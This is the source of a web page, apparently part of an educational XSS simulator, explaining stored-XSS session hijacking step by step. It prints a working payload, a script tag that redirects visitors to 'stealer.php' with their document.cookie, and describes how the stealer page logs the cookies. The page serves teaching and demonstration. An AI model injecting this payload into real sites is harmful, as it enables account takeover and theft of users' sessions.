<!DOCTYPE html>
<html>
<head>
	<title>XSS Session Hijacking</title>
	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">

	<style type="text/css">
		.left-mar{
			text-align: left;
			margin-left: 30px;
		}
	</style>

</head>
<body style="text-align: center; background-color: #E5E5E5">
	<?php include 'navbar.php' ?> <br>

	<h1>XSS Session Hijacking</h1><br>
	<p class="left-mar">This XSS simulator is designed to show the dangerous effects that XSS session hijacking attacks - and XSS <br>vulnerability in general - can make to your website if it is vulnerable to it.</p>
	<br>

	<h1>How it works</h1>
	<ol class="left-mar">
		<h3>Imagine this scenario</h3>
		<li>An attacker creating account.</li>
		<li>The attacker goes  to the blog and enters this code: 
			<?php $code = '<script>location.href=\'stealer.php?cookie=\'+document.cookie</script>'; echo '<code>' . htmlspecialchars($code) . '</code>'; ?> </li>
		<li>Now if any user enters the blog his cookie will be stolen.</li>
	</ol>
	<br>

	<h1>The Explanation</h1>
	<ul class="left-mar">
		<li>
			The code above is a JavaScript code that will execute whenever user logs to the blog.	
		</li>
		<li>
			The code uses <code>location.href=</code>  which will redirect a user to another page, in this case 'stealer.php'.	
		</li>
		<li>
			This page contains a code that will accept a GET parameter and stores it in the 'logs.txt' file <br> in the attacker server (the same server in this case).	
		</li>
		<li>
			The code above will send <code>document.cookie</code> as a GET parameter which is the user' cookies, <br> so when a user has an active session and his cookie stealed, then his session had been hijacked.
		</li>
 	</ul>	

</body>
</html>